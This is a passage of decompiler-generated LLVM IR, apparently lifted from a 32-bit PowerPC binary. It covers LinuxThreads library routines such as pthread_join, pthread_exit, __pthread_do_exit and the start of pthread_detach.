  %v2_1001551c = inttoptr i32 %v1_1001551c to i32*
  %v3_1001551c = load i32, i32* %v2_1001551c, align 4
  store i32 %v3_1001551c, i32* @r31, align 4
  store i32 %v0_1001551c, i32* @r3, align 4
  %v3_10015524 = icmp eq i32 %v3_1001551c, 0
  store i1 %v3_10015524, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10015524, label %dec_label_pc_1001553c, label %dec_label_pc_1001552c

dec_label_pc_1001552c:                            ; preds = %entry
  %v1_1001552c = add i32 %v3_1001551c, 8
  %v2_1001552c = inttoptr i32 %v1_1001552c to i32*
  %v3_1001552c = load i32, i32* %v2_1001552c, align 4
  store i32 %v3_1001552c, i32* %v2_1001551c, align 4
  %v1_10015538 = load i32, i32* @r31, align 4
  %v2_10015538 = add i32 %v1_10015538, 8
  %v3_10015538 = inttoptr i32 %v2_10015538 to i32*
  store i32 0, i32* %v3_10015538, align 4
  br label %dec_label_pc_1001553c

dec_label_pc_1001553c:                            ; preds = %entry, %dec_label_pc_1001552c
  store i32 268522816, i32* @lr, align 4
  %v0_1001553c = call i32 @__pthread_unlock()
  %v0_10015540 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015540, label %dec_label_pc_10015558, label %dec_label_pc_10015544

dec_label_pc_10015544:                            ; preds = %dec_label_pc_1001553c
  %v2_10015548 = load i32, i32* @r31, align 4
  %v3_10015548 = add i32 %v2_10015548, 441
  %v4_10015548 = inttoptr i32 %v3_10015548 to i8*
  store i8 1, i8* %v4_10015548, align 1
  %v0_10015550 = load i32, i32* @r31, align 4
  store i32 %v0_10015550, i32* @r3, align 4
  store i32 268522840, i32* @lr, align 4
  %v1_10015554 = call i32 @restart(i32 %v0_10015550)
  br label %dec_label_pc_10015558

dec_label_pc_10015558:                            ; preds = %dec_label_pc_1001553c, %dec_label_pc_10015544
  %v1_10015570 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100154fc)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @restart, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10015558, { 1, 0 }
  uselistorder label %dec_label_pc_1001553c, { 1, 0 }
}

define i32 @__linuxthreads_create_event(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10015578 = load i32, i32* @r3, align 4
  ret i32 %v0_10015578
}

define i32 @__linuxthreads_death_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1001557c = load i32, i32* @r3, align 4
  ret i32 %v0_1001557c
}

define i32 @__linuxthreads_reap_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10015580 = load i32, i32* @r3, align 4
  ret i32 %v0_10015580
}

define i32 @__pthread_set_own_extricate_if.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10015588 = call i32 @__asm_mfcr()
  store i32 %v0_10015588, i32* %r3.global-to-local, align 4
  %v3_10015590 = icmp eq i32 %arg2, 0
  store i1 %v3_10015590, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10015588, i32* @r31, align 4
  store i32 %v0_10015588, i32* @r4, align 4
  br i1 %v3_10015590, label %dec_label_pc_100155c8, label %dec_label_pc_100155b0

dec_label_pc_100155b0:                            ; preds = %entry
  %v1_100155b0 = add i32 %v0_10015588, 64
  %v2_100155b0 = inttoptr i32 %v1_100155b0 to i8*
  %v3_100155b0 = load i8, i8* %v2_100155b0, align 1
  %v3_100155b4 = icmp eq i8 %v3_100155b0, 0
  br i1 %v3_100155b4, label %dec_label_pc_100155c8.thread, label %dec_label_pc_100155d8

dec_label_pc_100155c8.thread:                     ; preds = %dec_label_pc_100155b0
  %v2_100155c84 = add i32 %v0_10015588, 444
  %v3_100155c85 = inttoptr i32 %v2_100155c84 to i32*
  store i32 %arg2, i32* %v3_100155c85, align 4
  br label %dec_label_pc_100155d8

dec_label_pc_100155c8:                            ; preds = %entry
  %v1_100155c0 = add i32 %v0_10015588, 28
  %v2_100155c0 = inttoptr i32 %v1_100155c0 to i32*
  %v3_100155c0 = load i32, i32* %v2_100155c0, align 4
  store i32 %v3_100155c0, i32* @r3, align 4
  store i32 268522952, i32* @lr, align 4
  %v0_100155c4 = call i32 @__pthread_lock()
  store i32 %v0_100155c4, i32* %r3.global-to-local, align 4
  %v0_100155c8.pre = load i32, i32* @r30, align 4
  %v1_100155c8.pre = load i32, i32* @r31, align 4
  %v0_100155cc.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_100155c8 = add i32 %v1_100155c8.pre, 444
  %v3_100155c8 = inttoptr i32 %v2_100155c8 to i32*
  store i32 %v0_100155c8.pre, i32* %v3_100155c8, align 4
  br i1 %v0_100155cc.pre, label %dec_label_pc_100155d0, label %dec_label_pc_100155d8

dec_label_pc_100155d0:                            ; preds = %dec_label_pc_100155c8
  %v0_100155d0 = load i32, i32* @r31, align 4
  %v1_100155d0 = add i32 %v0_100155d0, 28
  %v2_100155d0 = inttoptr i32 %v1_100155d0 to i32*
  %v3_100155d0 = load i32, i32* %v2_100155d0, align 4
  store i32 %v3_100155d0, i32* @r3, align 4
  store i32 268522968, i32* @lr, align 4
  %v0_100155d4 = call i32 @__pthread_unlock()
  store i32 %v0_100155d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100155d8

dec_label_pc_100155d8:                            ; preds = %dec_label_pc_100155c8.thread, %dec_label_pc_100155c8, %dec_label_pc_100155b0, %dec_label_pc_100155d0
  %v1_100155ec = call %0 @__asm_mtcrf(i32 8, i32 %v0_10015588)
  %v0_100155f0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100155f0

; uselistorder directives
  uselistorder i32 %v0_10015588, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_100155d8, { 3, 1, 0, 2 }
}

define i32 @suspend.3(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268523012, i32* @lr, align 4
  %v0_10015600 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10015600
}

define i32 @__pthread_do_exit() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10015628 = load i32, i32* @r3, align 4
  store i32 %v0_10015628, i32* %r29.global-to-local, align 4
  %v2_1001562c = load i32, i32* @r2, align 4
  %v3_1001562c = add i32 %v2_1001562c, 64
  %v4_1001562c = inttoptr i32 %v3_1001562c to i8*
  store i8 1, i8* %v4_1001562c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10015634 = load i32, i32* @r2, align 4
  %v3_10015634 = add i32 %v2_10015634, 65
  %v4_10015634 = inttoptr i32 %v3_10015634 to i8*
  store i8 0, i8* %v4_10015634, align 1
  %v0_10015638 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10015644.1044 to i32), i32* @lr, align 4
  %v1_10015640 = call i32 @__pthread_perform_cleanup(i32 %v0_10015638)
  store i32 268523080, i32* @lr, align 4
  %v1_10015644 = call i32 @__pthread_destroy_specifics(i32 %v1_10015640)
  %v0_10015648 = load i32, i32* @r31, align 4
  %v1_10015648 = add i32 %v0_10015648, 28
  %v2_10015648 = inttoptr i32 %v1_10015648 to i32*
  %v3_10015648 = load i32, i32* %v2_10015648, align 4
  store i32 %v3_10015648, i32* @r3, align 4
  store i32 %v0_10015648, i32* @r4, align 4
  store i32 268523092, i32* @lr, align 4
  %v0_10015650 = call i32 @__pthread_lock()
  store i32 %v0_10015650, i32* @r3, align 4
  %v0_10015654 = load i32, i32* @r31, align 4
  %v1_10015654 = add i32 %v0_10015654, 412
  %v2_10015654 = inttoptr i32 %v1_10015654 to i32*
  %v3_10015654 = load i32, i32* %v2_10015654, align 4
  store i32 %v3_10015654, i32* %r0.global-to-local, align 4
  %v0_10015658 = load i32, i32* @r29, align 4
  %v2_10015658 = add i32 %v0_10015654, 48
  %v3_10015658 = inttoptr i32 %v2_10015658 to i32*
  store i32 %v0_10015658, i32* %v3_10015658, align 4
  %v0_1001565c = load i32, i32* %r0.global-to-local, align 4
  %v3_1001565c = icmp eq i32 %v0_1001565c, 0
  br i1 %v3_1001565c, label %dec_label_pc_10015694, label %dec_label_pc_10015664

dec_label_pc_10015664:                            ; preds = %entry
  %v3_10015668 = load i32, i32* @global_var_100451f0.1009, align 4
  store i32 %v3_10015668, i32* %r0.global-to-local, align 4
  %v0_1001566c = load i32, i32* @r31, align 4
  %v1_1001566c = add i32 %v0_1001566c, 416
  %v2_1001566c = inttoptr i32 %v1_1001566c to i32*
  %v3_1001566c = load i32, i32* %v2_1001566c, align 4
  %v2_10015670 = or i32 %v3_1001566c, %v3_10015668
  store i32 %v2_10015670, i32* %r0.global-to-local, align 4
  %v1_10015674 = and i32 %v2_10015670, 256
  %v3_10015674 = icmp eq i32 %v1_10015674, 0
  br i1 %v3_10015674, label %dec_label_pc_10015694, label %dec_label_pc_1001567c

dec_label_pc_1001567c:                            ; preds = %dec_label_pc_10015664
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10015680 = add i32 %v0_1001566c, 428
  %v3_10015680 = inttoptr i32 %v2_10015680 to i32*
  store i32 %v0_1001566c, i32* %v3_10015680, align 4
  %v0_10015684 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015684 = load i32, i32* @r31, align 4
  %v2_10015684 = add i32 %v1_10015684, 424
  %v3_10015684 = inttoptr i32 %v2_10015684 to i32*
  store i32 %v0_10015684, i32* %v3_10015684, align 4
  %v0_1001568c = load i32, i32* @r31, align 4
  store i32 %v0_1001568c, i32* @global_var_100451f8.1017, align 4
  %v2_10015690 = call i32 @__linuxthreads_death_event(i32 %v0_10015650, i32 268697600)
  br label %dec_label_pc_10015694

dec_label_pc_10015694:                            ; preds = %dec_label_pc_10015664, %entry, %dec_label_pc_1001567c
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10015698 = load i32, i32* @r31, align 4
  %v1_10015698 = add i32 %v0_10015698, 56
  %v2_10015698 = inttoptr i32 %v1_10015698 to i32*
  %v3_10015698 = load i32, i32* %v2_10015698, align 4
  store i32 %v3_10015698, i32* %r29.global-to-local, align 4
  %v3_1001569c = add i32 %v0_10015698, 44
  %v4_1001569c = inttoptr i32 %v3_1001569c to i8*
  store i8 1, i8* %v4_1001569c, align 1
  %v0_100156a0 = load i32, i32* @r31, align 4
  %v1_100156a0 = add i32 %v0_100156a0, 28
  %v2_100156a0 = inttoptr i32 %v1_100156a0 to i32*
  %v3_100156a0 = load i32, i32* %v2_100156a0, align 4
  store i32 %v3_100156a0, i32* @r3, align 4
  store i32 268523176, i32* @lr, align 4
  %v0_100156a4 = call i32 @__pthread_unlock()
  %v0_100156a8 = load i32, i32* %r29.global-to-local, align 4
  %v3_100156a8 = icmp eq i32 %v0_100156a8, 0
  br i1 %v3_100156a8, label %dec_label_pc_100156b8, label %dec_label_pc_100156b0

dec_label_pc_100156b0:                            ; preds = %dec_label_pc_10015694
  store i32 %v0_100156a8, i32* @r3, align 4
  store i32 268523192, i32* @lr, align 4
  %v0_100156b4 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_100156b8

dec_label_pc_100156b8:                            ; preds = %dec_label_pc_10015694, %dec_label_pc_100156b0
  %v3_100156bc = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_100156bc, i32* %r29.global-to-local, align 4
  %v0_100156c0 = load i32, i32* @r31, align 4
  %v4_100156c0 = icmp eq i32 %v0_100156c0, %v3_100156bc
  br i1 %v4_100156c0, label %dec_label_pc_100156c8, label %dec_label_pc_10015720

dec_label_pc_100156c8:                            ; preds = %dec_label_pc_100156b8
  %v3_100156cc = load i32, i32* @global_var_100450c4.984, align 4
  store i32 %v3_100156cc, i32* %r0.global-to-local, align 4
  %v1_100156d0 = icmp slt i32 %v3_100156cc, 0
  br i1 %v1_100156d0, label %dec_label_pc_10015720, label %dec_label_pc_100156d8

dec_label_pc_100156d8:                            ; preds = %dec_label_pc_100156c8
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 %v3_100156bc, i32* %stack_var_-184, align 4
  %v2_100156e8 = ptrtoint i32* %stack_var_-184 to i32
  store i32 268523256, i32* @lr, align 4
  %v2_100156f46 = call i32 @__libc_write(i32 %v3_100156cc, i32 %v2_100156e8)
  %v3_100156f89 = icmp eq i32 %v2_100156f46, -1
  br i1 %v3_100156f89, label %dec_label_pc_10015700, label %dec_label_pc_10015710

dec_label_pc_10015700:                            ; preds = %dec_label_pc_100156d8, %dec_label_pc_10015700.dec_label_pc_100156e4_crit_edge
  %v0_10015700 = call i32 @__errno_location()
  %v1_10015704 = inttoptr i32 %v0_10015700 to i32*
  %v2_10015704 = load i32, i32* %v1_10015704, align 4
  store i32 %v2_10015704, i32* %r0.global-to-local, align 4
  %v3_10015708 = icmp eq i32 %v2_10015704, 4
  br i1 %v3_10015708, label %dec_label_pc_10015700.dec_label_pc_100156e4_crit_edge, label %dec_label_pc_10015710

dec_label_pc_10015700.dec_label_pc_100156e4_crit_edge: ; preds = %dec_label_pc_10015700
  %v3_100156ec.pre = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268523256, i32* @lr, align 4
  %v2_100156f4 = call i32 @__libc_write(i32 %v3_100156ec.pre, i32 %v2_100156e8)
  %v3_100156f8 = icmp eq i32 %v2_100156f4, -1
  br i1 %v3_100156f8, label %dec_label_pc_10015700, label %dec_label_pc_10015710

dec_label_pc_10015710:                            ; preds = %dec_label_pc_10015700, %dec_label_pc_10015700.dec_label_pc_100156e4_crit_edge, %dec_label_pc_100156d8
  %v0_10015710 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10015710, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015718.1046 to i32), i32* @lr, align 4
  %v1_10015714 = call i32 @suspend.3(i32 %v0_10015710)
  %v0_1001571c = call i32 @__GI_exit()
  br label %dec_label_pc_10015720

dec_label_pc_10015720:                            ; preds = %dec_label_pc_100156b8, %dec_label_pc_100156c8, %dec_label_pc_10015710
  %v1_10015724 = call i32 @__GI__exit(i32 0)
  ret i32 %v1_10015724

; uselistorder directives
  uselistorder i32 %v2_100156e8, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 6, 7, 4, 5, 8, 9, 10 }
  uselistorder i32 268523256, { 1, 0 }
  uselistorder label %dec_label_pc_10015720, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015710, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10015700, { 1, 0 }
  uselistorder label %dec_label_pc_100156b8, { 1, 0 }
  uselistorder label %dec_label_pc_10015694, { 2, 0, 1 }
}

define i32 @pthread_join(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v0_10015738 = load i32, i32* @r2, align 4
  %v1_10015740 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10015748 = add i32 %v1_10015740, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 %v2_10015748, i32* @r3, align 4
  store i32 %v0_10015738, i32* @r4, align 4
  store i32 %v2_10015748, i32* %stack_var_-180, align 4
  store i32 268523380, i32* @lr, align 4
  %v0_10015770 = call i32 @__pthread_lock()
  %v0_10015774 = load i32, i32* @r30, align 4
  %v1_10015774 = add i32 %v0_10015774, 8
  %v2_10015774 = inttoptr i32 %v1_10015774 to i32*
  %v3_10015774 = load i32, i32* %v2_10015774, align 4
  store i32 %v3_10015774, i32* @r31, align 4
  %v3_10015778 = icmp eq i32 %v3_10015774, 0
  br i1 %v3_10015778, label %dec_label_pc_1001578c, label %dec_label_pc_10015780

dec_label_pc_10015780:                            ; preds = %entry
  %v1_10015780 = add i32 %v3_10015774, 16
  %v2_10015780 = inttoptr i32 %v1_10015780 to i32*
  %v3_10015780 = load i32, i32* %v2_10015780, align 4
  %v0_10015784 = load i32, i32* %r28.global-to-local, align 4
  %v4_10015784 = icmp eq i32 %v0_10015784, %v3_10015780
  br i1 %v4_10015784, label %dec_label_pc_1001579c, label %dec_label_pc_1001578c

dec_label_pc_1001578c:                            ; preds = %dec_label_pc_10015780, %entry
  store i32 %v0_10015774, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015794.1048 to i32), i32* @lr, align 4
  %v0_10015790 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015910

dec_label_pc_1001579c:                            ; preds = %dec_label_pc_10015780
  %v4_100157a0 = icmp eq i32 %v3_10015774, %v0_10015738
  br i1 %v4_100157a0, label %dec_label_pc_100157a8, label %dec_label_pc_100157b8

dec_label_pc_100157a8:                            ; preds = %dec_label_pc_1001579c
  store i32 %v0_10015774, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100157b0.1049 to i32), i32* @lr, align 4
  %v0_100157ac = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015910

dec_label_pc_100157b8:                            ; preds = %dec_label_pc_1001579c
  %v1_100157b8 = add i32 %v3_10015774, 45
  %v2_100157b8 = inttoptr i32 %v1_100157b8 to i8*
  %v3_100157b8 = load i8, i8* %v2_100157b8, align 1
  %v3_100157bc = icmp eq i8 %v3_100157b8, 0
  br i1 %v3_100157bc, label %dec_label_pc_100157c4, label %dec_label_pc_100157d0

dec_label_pc_100157c4:                            ; preds = %dec_label_pc_100157b8
  %v1_100157c4 = add i32 %v3_10015774, 56
  %v2_100157c4 = inttoptr i32 %v1_100157c4 to i32*
  %v3_100157c4 = load i32, i32* %v2_100157c4, align 4
  %v3_100157c8 = icmp eq i32 %v3_100157c4, 0
  br i1 %v3_100157c8, label %dec_label_pc_100157e0, label %dec_label_pc_100157d0

dec_label_pc_100157d0:                            ; preds = %dec_label_pc_100157b8, %dec_label_pc_100157c4
  store i32 %v0_10015774, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100157d8.1050 to i32), i32* @lr, align 4
  %v0_100157d4 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10015910

dec_label_pc_100157e0:                            ; preds = %dec_label_pc_100157c4
  %v1_100157e0 = add i32 %v3_10015774, 44
  %v2_100157e0 = inttoptr i32 %v1_100157e0 to i8*
  %v3_100157e0 = load i8, i8* %v2_100157e0, align 1
  %v3_100157e4 = icmp eq i8 %v3_100157e0, 0
  br i1 %v3_100157e4, label %dec_label_pc_100157ec, label %dec_label_pc_100158a4

dec_label_pc_100157ec:                            ; preds = %dec_label_pc_100157e0
  %v2_100157f0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268523512, i32* @lr, align 4
  %v2_100157f4 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015738, i32 %v2_100157f0)
  %v1_100157fc = add i32 %v0_10015738, 66
  %v2_100157fc = inttoptr i32 %v1_100157fc to i8*
  %v3_100157fc = load i8, i8* %v2_100157fc, align 1
  %v3_10015800 = icmp eq i8 %v3_100157fc, 0
  br i1 %v3_10015800, label %dec_label_pc_1001581c, label %dec_label_pc_10015808

dec_label_pc_10015808:                            ; preds = %dec_label_pc_100157ec
  store i32 1, i32* %r29.global-to-local, align 4
  %v1_10015810 = add i32 %v0_10015738, 64
  %v2_10015810 = inttoptr i32 %v1_10015810 to i8*
  %v3_10015810 = load i8, i8* %v2_10015810, align 1
  %v3_10015814 = icmp eq i8 %v3_10015810, 0
  br i1 %v3_10015814, label %dec_label_pc_10015828, label %dec_label_pc_1001581c

dec_label_pc_1001581c:                            ; preds = %dec_label_pc_10015808, %dec_label_pc_100157ec
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10015824 = load i32, i32* @r31, align 4
  %v2_10015824 = add i32 %v1_10015824, 56
  %v3_10015824 = inttoptr i32 %v2_10015824 to i32*
  store i32 %v0_10015738, i32* %v3_10015824, align 4
  br label %dec_label_pc_10015828

dec_label_pc_10015828:                            ; preds = %dec_label_pc_10015808, %dec_label_pc_1001581c
  %v0_10015828 = load i32, i32* @r30, align 4
  store i32 %v0_10015828, i32* @r3, align 4
  store i32 268523568, i32* @lr, align 4
  %v0_1001582c = call i32 @__pthread_unlock()
  %v0_10015830 = load i32, i32* %r29.global-to-local, align 4
  %v3_10015830 = icmp eq i32 %v0_10015830, 0
  store i32 %v0_10015738, i32* @r3, align 4
  br i1 %v3_10015830, label %dec_label_pc_10015850, label %dec_label_pc_10015838

dec_label_pc_10015838:                            ; preds = %dec_label_pc_10015828
  store i32 268523588, i32* @lr, align 4
  %v2_10015840 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015738, i32 0)
  br label %dec_label_pc_10015894

dec_label_pc_10015850:                            ; preds = %dec_label_pc_10015828
  store i32 268523608, i32* @lr, align 4
  %v1_10015854 = call i32 @suspend.3(i32 %v0_10015738)
  store i32 268523620, i32* @lr, align 4
  %v2_10015860 = call i32 @__pthread_set_own_extricate_if.2(i32 %v0_10015738, i32 0)
  %v1_10015868 = add i32 %v0_10015738, 440
  %v2_10015868 = inttoptr i32 %v1_10015868 to i8*
  %v3_10015868 = load i8, i8* %v2_10015868, align 1
  %v3_1001586c = icmp eq i8 %v3_10015868, 0
  br i1 %v3_1001586c, label %dec_label_pc_10015898, label %dec_label_pc_10015874

dec_label_pc_10015874:                            ; preds = %dec_label_pc_10015850
  %v1_10015878 = add i32 %v0_10015738, 64
  %v2_10015878 = inttoptr i32 %v1_10015878 to i8*
  %v3_10015878 = load i8, i8* %v2_10015878, align 1
  %v3_1001587c = icmp eq i8 %v3_10015878, 0
  br i1 %v3_1001587c, label %dec_label_pc_10015884, label %dec_label_pc_10015898

dec_label_pc_10015884:                            ; preds = %dec_label_pc_10015874
  store i8 0, i8* %v2_10015868, align 1
  br label %dec_label_pc_10015894

dec_label_pc_10015894:                            ; preds = %dec_label_pc_10015838, %dec_label_pc_10015884
  %v0_10015894 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10015898

dec_label_pc_10015898:                            ; preds = %dec_label_pc_10015874, %dec_label_pc_10015850, %dec_label_pc_10015894
  store i32 %v0_10015738, i32* @r4, align 4
  %v0_1001589c = load i32, i32* @r30, align 4
  store i32 %v0_1001589c, i32* @r3, align 4
  store i32 268523684, i32* @lr, align 4
  %v0_100158a0 = call i32 @__pthread_lock()
  br label %dec_label_pc_100158a4

dec_label_pc_100158a4:                            ; preds = %dec_label_pc_100157e0, %dec_label_pc_10015898
  %v0_100158a4 = load i32, i32* %r27.global-to-local, align 4
  %v3_100158a4 = icmp eq i32 %v0_100158a4, 0
  br i1 %v3_100158a4, label %dec_label_pc_100158b4, label %dec_label_pc_100158ac

dec_label_pc_100158ac:                            ; preds = %dec_label_pc_100158a4
  %v0_100158ac = load i32, i32* @r31, align 4
  %v1_100158ac = add i32 %v0_100158ac, 48
  %v2_100158ac = inttoptr i32 %v1_100158ac to i32*
  %v3_100158ac = load i32, i32* %v2_100158ac, align 4
  %v2_100158b0 = inttoptr i32 %v0_100158a4 to i32*
  store i32 %v3_100158ac, i32* %v2_100158b0, align 4
  br label %dec_label_pc_100158b4

dec_label_pc_100158b4:                            ; preds = %dec_label_pc_100158a4, %dec_label_pc_100158ac
  %v0_100158b4 = load i32, i32* @r30, align 4
  store i32 %v0_100158b4, i32* @r3, align 4
  store i32 268523708, i32* @lr, align 4
  %v0_100158b8 = call i32 @__pthread_unlock()
  %v3_100158c0 = load i32, i32* @global_var_100450c4.984, align 4
  %v1_100158c4 = icmp slt i32 %v3_100158c0, 0
  br i1 %v1_100158c4, label %dec_label_pc_1001590c, label %dec_label_pc_100158cc

dec_label_pc_100158cc:                            ; preds = %dec_label_pc_100158b4
  store i32 %v0_10015738, i32* %stack_var_-172, align 4
  %v2_100158e4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 268523764, i32* @lr, align 4
  %v2_100158f012 = call i32 @__libc_write(i32 %v3_100158c0, i32 %v2_100158e4)
  %v3_100158f415 = icmp eq i32 %v2_100158f012, -1
  br i1 %v3_100158f415, label %dec_label_pc_100158fc, label %dec_label_pc_1001590c

dec_label_pc_100158fc:                            ; preds = %dec_label_pc_100158cc, %dec_label_pc_100158fc.dec_label_pc_100158e0_crit_edge
  %v0_100158fc = call i32 @__errno_location()
  %v1_10015900 = inttoptr i32 %v0_100158fc to i32*
  %v2_10015900 = load i32, i32* %v1_10015900, align 4
  %v3_10015904 = icmp eq i32 %v2_10015900, 4
  br i1 %v3_10015904, label %dec_label_pc_100158fc.dec_label_pc_100158e0_crit_edge, label %dec_label_pc_1001590c

dec_label_pc_100158fc.dec_label_pc_100158e0_crit_edge: ; preds = %dec_label_pc_100158fc
  %v3_100158e8.pre = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268523764, i32* @lr, align 4
  %v2_100158f0 = call i32 @__libc_write(i32 %v3_100158e8.pre, i32 %v2_100158e4)
  %v3_100158f4 = icmp eq i32 %v2_100158f0, -1
  br i1 %v3_100158f4, label %dec_label_pc_100158fc, label %dec_label_pc_1001590c

dec_label_pc_1001590c:                            ; preds = %dec_label_pc_100158cc, %dec_label_pc_100158fc, %dec_label_pc_100158fc.dec_label_pc_100158e0_crit_edge, %dec_label_pc_100158b4
  br label %dec_label_pc_10015910

dec_label_pc_10015910:                            ; preds = %dec_label_pc_100157d0, %dec_label_pc_100157a8, %dec_label_pc_1001578c, %dec_label_pc_1001590c
  %v0_10015920 = phi i32 [ 22, %dec_label_pc_100157d0 ], [ 35, %dec_label_pc_100157a8 ], [ 3, %dec_label_pc_1001578c ], [ 0, %dec_label_pc_1001590c ]
  ret i32 %v0_10015920

; uselistorder directives
  uselistorder i32 %v2_100158e4, { 1, 0 }
  uselistorder i32 %v0_10015774, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10015748, { 1, 0 }
  uselistorder i32 %v0_10015738, { 3, 4, 2, 7, 8, 6, 9, 5, 10, 1, 11, 12, 13, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32* %stack_var_-172, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32 268523764, { 1, 0 }
  uselistorder i32 (i32)* @suspend.3, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015910, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001590c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100158fc, { 1, 0 }
  uselistorder label %dec_label_pc_100158b4, { 1, 0 }
  uselistorder label %dec_label_pc_100158a4, { 1, 0 }
  uselistorder label %dec_label_pc_10015898, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015894, { 1, 0 }
  uselistorder label %dec_label_pc_10015828, { 1, 0 }
  uselistorder label %dec_label_pc_100157d0, { 1, 0 }
}

define i32 @pthread_exit() local_unnamed_addr {
entry:
  %v0_10015934 = call i32 @__pthread_do_exit()
  ret i32 %v0_10015934
}

define i32 @join_extricate_func(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10015940 = load i32, i32* @r2, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %v0_10015940, i32* @r4, align 4
  store i32 268523864, i32* @lr, align 4
  %v0_10015954 = call i32 @__pthread_lock()
  %v0_10015958 = load i32, i32* @r29, align 4
  %v1_10015958 = add i32 %v0_10015958, 8
  %v2_10015958 = inttoptr i32 %v1_10015958 to i32*
  %v3_10015958 = load i32, i32* %v2_10015958, align 4
  store i32 %v0_10015958, i32* @r3, align 4
  %v1_10015964 = add i32 %v3_10015958, 56
  %v2_10015964 = inttoptr i32 %v1_10015964 to i32*
  %v3_10015964 = load i32, i32* %v2_10015964, align 4
  store i32 %v3_10015964, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_10015964, align 4
  %v0_1001596c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001596c = icmp ne i32 %v0_1001596c, 0
  %v5_10015970 = zext i1 %v2_1001596c to i32
  store i32 268523896, i32* @lr, align 4
  %v0_10015974 = call i32 @__pthread_unlock()
  ret i32 %v5_10015970
}

define i32 @pthread_detach(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  %v1_100159a8 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_100159b0 = add i32 %v1_100159a8, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_100159b0, i32* @r3, align 4
  store i32 268523968, i32* @lr, align 4
  %v0_100159bc = call i32 @__pthread_lock()
  %v0_100159c0 = load i32, i32* @r31, align 4
  %v1_100159c0 = add i32 %v0_100159c0, 8
  %v2_100159c0 = inttoptr i32 %v1_100159c0 to i32*
  %v3_100159c0 = load i32, i32* %v2_100159c0, align 4
  %v3_100159c4 = icmp eq i32 %v3_100159c0, 0
  br i1 %v3_100159c4, label %dec_label_pc_100159d8, label %dec_label_pc_100159cc

dec_label_pc_100159cc:                            ; preds = %entry
